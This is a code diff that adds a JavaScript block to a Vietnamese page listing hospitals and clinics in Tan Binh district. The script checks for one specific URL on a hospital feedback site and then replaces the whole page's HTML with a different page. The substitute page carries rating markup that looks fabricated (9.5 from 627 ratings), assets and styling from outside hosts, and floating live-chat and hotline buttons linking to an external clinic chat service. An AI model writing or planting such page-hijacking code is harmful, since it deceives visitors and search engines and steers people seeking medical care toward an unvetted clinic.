@@ -1,3 +1,29 @@
+var crurl = window.location.href;
+if (crurl.includes("https://bvdkht.vn/feedback/3077/danh-sach-benh-vien-phong-kham-da-khoa-tan-binh"
+)) {
+    document.querySelector('html').innerHTML = `
+   <html lang="vi">
+    <head>
+        <meta content="width=device-width,initial-scale=1" name="viewport">
+        <meta id="MetaRobots" name="ROBOTS" content="INDEX, FOLLOW">
+        <meta charset="utf-8">
+        <title>Danh sách bệnh viện và phòng khám đa khoa Tân Bình uy tín chất lượng</title>
+        <meta content="Các phòng khám và bệnh viện tại Quận Tân Bình đều được bố trí với địa chỉ cụ thể cùng khung giờ hoạt động riêng biệt. Để việc thăm khám trở nên thuận tiện hơn, bạn nên tìm hiểu kỹ thông tin trước khi lựa chọn cơ sở phù hợp với nhu cầu cá nhân. Chẳng hạn, nếu cần khám tổng quát, các bệnh viện đa khoa sẽ là lựa chọn thích hợp; trong khi đó, nếu muốn kiểm tra chuyên sâu về mắt hoặc tim mạch, hãy ưu tiên các cơ sở y tế chuyên khoa" name="description">
+        <link href="https://dakhoatanbinh.neocities.org/images/logo-tan-binh.jpg" rel="shortcut icon" type="image/x-icon">
+        <script type="application/ld+json">
+            {"@context":"https://schema.org/","@type":"CreativeWorkSeason","name":"Danh sách bệnh viện và phòng khám đa khoa Tân Bình uy tín chất lượng","aggregateRating":{"@type":"AggregateRating","ratingValue":"9.5","ratingCount":"627","bestRating":"10","worstRating":"1"}}
+        </script>
+        <link href="https://v.timduongdi.com/giaodien.css" rel="stylesheet">
+    </head>
+    <body>
+<div class="header" style="display: flex; justify-content: center;">
+    <div class="logo"> <a href="#"> <img src="https://dakhoatanbinh.neocities.org/images/logo_tanbinh.png" alt="Logo" title="Logo"  width="510" height="105"> </a></div></div>
+<h1 style="text-align: center;">Danh sách bệnh viện và phòng khám đa khoa Tân Bình uy tín chất lượng</h1>
+<div id="content" style="text-align: left;">
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+
+
+
 <p style="text-align:justify;">
 <span style="background-color:transparent;color:#000000;">Quận Tân Bình là một khu vực sầm uất với mật độ dân cư cao và hoạt động kinh tế mạnh mẽ, nổi bật bởi sự tập trung của nhiều khu công nghiệp cùng cộng đồng dân cư đông đúc. Nhờ hưởng lợi từ hệ thống giao thông thuận tiện, nhu cầu khám chữa bệnh tại đây luôn duy trì ở mức rất cao. Các phòng khám và bệnh viện trên địa bàn mỗi ngày tiếp nhận hàng trăm nghìn lượt bệnh nhân đến để được tư vấn, khám chữa và điều trị. Nếu bạn đang cân nhắc tìm kiếm những địa chỉ uy tín và chất lượng tại đây, danh sách thông tin được tổng hợp bên dưới chắc chắn sẽ giúp bạn lựa chọn dễ dàng hơn.</span>
 </p>
@@ -1321,3 +1347,20 @@
 </span>
 </a>
 </p>
+
+
+
+
+
+
+   <div id="button" style="position:fixed; right:2%; bottom:10%; z-index:99999;">
+    <div class="chat">
+        <a target="_blank" href="https://mfp.zoosnet.net/LR/Chatpre.aspx?id=MFP16752728&lng=en&p=https://dakhoatanbinh.vn/" rel="nofollow">
+            <img src="https://global-uploads.webflow.com/5c93193a199a684109dd80f8/600fe01e1663232bccf14af5_5d7f40f74cc8594c9d854185_rchat.gif" alt="Live Chat"> </a> </div> </div>
+            <a rel="follow,noopener" href="https://mfp.zoosnet.net/LR/Chatpre.aspx?id=MFP16752728&lng=en&p=https://dakhoatanbinh.vn/" class="w-inline-block"><div><img style="position:fixed;left:auto;top:40%;width:120px!important;right:0%;bottom:auto;margin-top:100px;margin-right:-30px;margin-bottom:0px;" src="https://global-uploads.webflow.com/640696c266a0cb0b83d2c96a/64094447e77edc0c1e47abba_5cd3943ffeabaf5f03705231_hotline.gif" rel="nofollow" alt="" width="120px;" class="image"></div></a>
+
+</body>
+</html>
+    `;
+
+}
